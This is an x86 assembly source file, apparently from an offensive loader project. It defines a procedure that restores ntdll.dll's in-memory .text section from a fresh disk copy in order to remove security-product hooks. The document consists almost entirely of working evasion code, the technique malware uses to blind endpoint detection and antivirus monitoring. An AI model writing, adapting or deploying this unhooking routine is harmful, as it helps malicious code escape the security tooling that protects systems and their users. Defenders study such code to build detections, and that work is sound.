; Unhooking function; Currently unused, but pending implementation

	strNtDllDll			db 'ntdll.dll', 0
	strNtDllPath		db 'C:\Windows\System32\ntdll.dll', 0
	strTextSection		db '.text', 0



proc Unhook
	local	NtDll:DWORD
	local	ModuleInfo:MODULEINFO
	local	NtDllFile:DWORD
	local	NtDllMapping:DWORD
	local	NtDllMappingAddress:DWORD
	local	OldProtect:DWORD

	; Get module handle of ntdll.dll
	invoke	GetModuleHandleA, strNtDllDll
	test	eax, eax
	jz		.ret
	mov		[NtDll], eax

	; ZeroMemory ModuleInfo
	lea		edi, [ModuleInfo]
	mov		ecx, sizeof.MODULEINFO
	xor		eax, eax
	cld
	rep		stosb

	; Get module information of ntdll.dll
	lea		eax, [ModuleInfo]
	invoke	GetModuleInformation, -1, [NtDll], eax, sizeof.MODULEINFO
	jz		.ret

	; Open file ntdll.dll
	invoke	CreateFileA, strNtDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
	test	eax, eax
	jz		.ret
	mov		[NtDllFile], eax

	; Create file mapping
	invoke	CreateFileMappingA, [NtDllFile], NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL
	test	eax, eax
	jz		.ret
	mov		[NtDllMapping], eax

	; Map view of file
	invoke	MapViewOfFile, [NtDllMapping], FILE_MAP_READ, 0, 0, 0
	test	eax, eax
	jz		.ret
	mov		[NtDllMappingAddress], eax

	; Loop sections
	lea		ebx, [ModuleInfo]
	mov		ebx, [ebx + MODULEINFO.BaseOfDll]
	add		ebx, [ebx + IMAGE_DOS_HEADER.e_lfanew]
	movzx	ecx, word[ebx + IMAGE_NT_HEADERS32.FileHeader.NumberOfSections]
	add		ebx, sizeof.IMAGE_NT_HEADERS32
.L_sections:
	push	ecx ebx

	; Check, if section is '.text'
	lea		esi, [ebx + IMAGE_SECTION_HEADER.Name]
	cinvoke	strcmp, esi, strTextSection
	test	eax, eax
	jnz		.C_sections

	; Make section writeable
	lea		edi, [ModuleInfo]
	mov		edi, [edi + MODULEINFO.BaseOfDll]
	add		edi, [ebx + IMAGE_SECTION_HEADER.VirtualAddress]
	mov		ecx, [ebx + IMAGE_SECTION_HEADER.VirtualSize]
	lea		eax, [OldProtect]
	invoke	VirtualProtect, edi, ecx, PAGE_EXECUTE_READWRITE, eax
	test	eax, eax
	jz		.ret

	; Overwrite section with original .text section of original ntdll.dll
	mov		ecx, [ebx + IMAGE_SECTION_HEADER.VirtualSize]
	mov		esi, [NtDllMappingAddress]
	add		esi, [ebx + IMAGE_SECTION_HEADER.VirtualAddress]
	cld
	rep		movsb

	; Apply previous VirtualProtect
	lea		edi, [ModuleInfo]
	mov		edi, [edi + MODULEINFO.BaseOfDll]
	add		edi, [ebx + IMAGE_SECTION_HEADER.VirtualAddress]
	mov		ecx, [ebx + IMAGE_SECTION_HEADER.VirtualSize]
	lea		eax, [OldProtect]
	invoke	VirtualProtect, edi, ecx, [OldProtect], eax
	test	eax, eax
	jz		.ret

.C_sections:
	pop		ebx ecx
	add		ebx, sizeof.IMAGE_SECTION_HEADER
	dec		ecx
	test	ecx, ecx
	jnz		.L_sections

	mov		eax, 1
	ret
.ret:
	xor		eax, eax
	ret
endp